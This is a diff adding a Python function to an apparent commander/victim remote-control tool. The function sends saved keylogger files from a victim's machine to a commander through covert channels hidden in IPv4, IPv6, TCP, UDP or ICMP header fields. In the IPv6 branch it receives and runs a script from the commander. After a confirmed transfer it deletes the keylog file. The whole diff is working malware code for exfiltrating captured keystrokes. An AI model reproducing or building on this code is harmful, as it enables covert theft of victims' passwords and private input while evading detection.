@@ -3710,3 +3710,93 @@ def transfer_file_covert_helper_print_config(file_path: str, header: str, field:
     print(constants.GET_FILE_INIT_MSG.format(file_path))
     print(constants.COVERT_CONFIGURATION_FROM_CMDR.format(header, field))
     print(constants.COVERT_DATA_PACKET_LOCATION_MSG.format(header, field))
+
+
+def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
+                                dest_port: int, source_port: int,
+                                choices: tuple, file_path: str):
+    """
+    A different version from the regular transfer_file_covert(),
+    but specifically deals with the transfer of saved keylogged
+    files from victim to commander.
+
+    @param sock:
+        The commander socket
+
+    @param dest_ip:
+        The commander's IP address
+
+    @param dest_port:
+        The commander's port number
+
+    @param source_port:
+        The victim's port number
+
+    @param choices:
+        A tuple containing the covert channel configuration
+        (header/field)
+
+    @param file_path:
+        A string representing the file path of keylog .txt file in the current directory
+
+    @return: None
+    """
+    # CHECK: If destination field choice, do nothing
+    if constants.DESTINATION_ADDRESS_FIELD in choices:
+        __transfer_file_dst_addr_error_handler(choices[1], choices[0])
+        return None
+
+    # Initialize map
+    header_field_function_map = __get_protocol_header_transfer_function_map()
+
+    # Find the choice(header/field) in map, get and call the mapped function
+    if choices in header_field_function_map:
+        selected_function = header_field_function_map.get(choices)
+
+        # DIFFERENT HANDLERS: IPv4
+        if constants.IPV4 in choices:
+            if constants.SOURCE_ADDRESS_FIELD in choices:
+                selected_function(sock, dest_ip, dest_port, source_port, file_path)
+
+            elif selected_function is not None and callable(selected_function):
+                selected_function(sock, dest_ip, file_path)
+
+        # DIFFERENT HANDLERS: IPv6
+        elif constants.IPV6 in choices:
+            # Receive file, execute script and send IPv6 to commander for sniff (DON'T RETURN ANYTHING)
+            receive_get_ipv6_script(sock, dest_ip, dest_port)
+
+            # Get IPv6 address and port from commander
+            cmdr_ipv6_addr, cmdr_ipv6_port = sock.recv(1024).decode().split("/")
+            selected_function(sock, cmdr_ipv6_addr, int(cmdr_ipv6_port), file_path)
+
+        # DIFFERENT HANDLERS: TCP or UDP
+        elif constants.TCP in choices or constants.UDP in choices:
+            selected_function(sock, dest_ip, dest_port, source_port, file_path)
+
+        # DIFFERENT HANDLERS: ICMP
+        elif constants.ICMP in choices:
+            selected_function(sock, dest_ip, file_path)
+
+        else:
+            print(constants.CALL_MAP_FUNCTION_ERROR)
+            return None
+    else:
+        print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
+        return None
+
+    # Get an ACK from the victim for success
+    transfer_result = sock.recv(1024).decode()
+
+    if transfer_result == constants.VICTIM_ACK:
+        print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
+                                                        dest_ip,
+                                                        dest_port))
+        # Delete .txt file
+        delete_file(file_path)
+        print(constants.AWAIT_NEXT_OP_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+    else:
+        print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+        print(constants.AWAIT_NEXT_OP_MSG)
+        print(constants.MENU_CLOSING_BANNER)
